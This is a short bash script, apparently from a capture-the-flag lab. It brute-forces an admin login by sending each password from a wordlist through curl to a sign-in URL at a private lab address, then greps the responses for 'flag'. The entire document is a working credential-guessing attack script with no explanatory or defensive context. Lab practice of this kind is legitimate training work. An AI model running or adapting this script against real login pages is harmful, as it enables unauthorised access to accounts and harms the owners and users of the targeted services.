#!/bin/bash
input="wordlist.txt"
while IFS= read -r line
do
  echo "Trying pass : " $line
  curl "http://10.11.100.7/?page=signin&username=admin&password=$line&Login=Login#" 2>&- | grep flag
done < "$input"